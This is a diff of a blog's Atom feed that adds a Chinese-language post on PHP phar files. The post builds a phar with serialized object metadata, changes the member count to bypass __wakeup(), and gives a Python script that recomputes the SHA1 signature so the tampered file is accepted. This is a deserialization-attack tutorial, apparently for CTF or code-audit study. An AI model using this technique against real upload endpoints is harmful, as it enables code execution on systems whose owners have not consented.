@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-06-22T14:43:08.153Z</updated>
+  <updated>2022-07-05T18:38:19.268Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>phar signature</title>
+    <link href="http://example.com/2022/07/06/phar-signature/"/>
+    <id>http://example.com/2022/07/06/phar-signature/</id>
+    <published>2022-07-05T17:46:42.000Z</published>
+    <updated>2022-07-05T18:38:19.268Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p><em>脚本在最后</em></p><p>如果需要手动修改phar中的内容，直接修改，然后上传，php解析会报错<br><span id="more"></span><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EzTrick</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$waf</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">EzTrick</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><br>比如如上代码<br>生成以后用hex editor打开<br><img src="/2022/07/06/phar-signature/1.jpg" alt><br>可以看到如上信息，如果我们去修改他的成员数，2改成3，去绕过__wakeup()，然后去上传<br><img src="/2022/07/06/phar-signature/2.jpg" alt><br>可以看到报错了，说是signature出错<br>那么这时候就要去了解phar文件中signature的形成了</p><h2 id="2-phar结构"><a href="#2-phar结构" class="headerlink" title="2.phar结构"></a>2.phar结构</h2><p><a href="https://www.php.net/manual/en/phar.fileformat.signature.php">https://www.php.net/manual/en/phar.fileformat.signature.php</a><br>官网有解释<br><img src="/2022/07/06/phar-signature/3.jpg" alt><br>大致意思就是signature是在文件内容的后端</p><p><a href="https://stackoverflow.com/questions/23592827/how-phar-signature-prevents-tampering-with-files">https://stackoverflow.com/questions/23592827/how-phar-signature-prevents-tampering-with-files</a><br>stackoverflow上面也有解释<br><img src="/2022/07/06/phar-signature/6.jpg" alt><br>那么意思就是用整个文件内容去进行加密<br>且默认是用sha1去加密，不过php8是默认用sha256加密</p><h2 id="3-生成signature"><a href="#3-生成signature" class="headerlink" title="3.生成signature"></a>3.生成signature</h2><p>那我们可以用php输出signature在比对一下十六进制文件，就可以知道具体位置了<br>在如上php代码末尾加上一段<code>var_dump($phar-&gt;getSignature());</code><br><img src="/2022/07/06/phar-signature/4.jpg" alt><br>在对比hex editor打开的<br><img src="/2022/07/06/phar-signature/5.jpg" alt><br>可以发现是在text后面32位，就是sha1加密<br>那么是用整个文件内容去加密，那应该就是用加密字符的前面内容去加密，我们可以用python去验证一下<br><img src="/2022/07/06/phar-signature/7.jpg" alt><br>可以看到与hash一样，那么我们可以写脚本，把修改以后的sha1替换了<br>由于后面的位数是一样的，那么脚本可以从后往前进行读取<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">new_sha1 = hashlib.sha1(c[:-<span class="number">28</span>]).digest() <span class="comment">#获取新的sha1</span></span><br><span class="line"></span><br><span class="line">new = c[:-<span class="number">28</span>]+hashlib.sha1(c[:-<span class="number">28</span>]).digest()+c[-<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;phar_t.phar&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(new)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><br>sha1的加密脚本就可以这么实现<br><img src="/2022/07/06/phar-signature/8.jpg" alt><br>可以看到成功读取了</p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h2&gt;&lt;p&gt;&lt;em&gt;脚本在最后&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;如果需要手动修改phar中的内容，直接修改，然后上传，php解析会报错&lt;br&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    <category term="php" scheme="http://example.com/tags/php/"/>
+    
+  </entry>
   
   <entry>
     <title>implement of cross entropy loss</title>
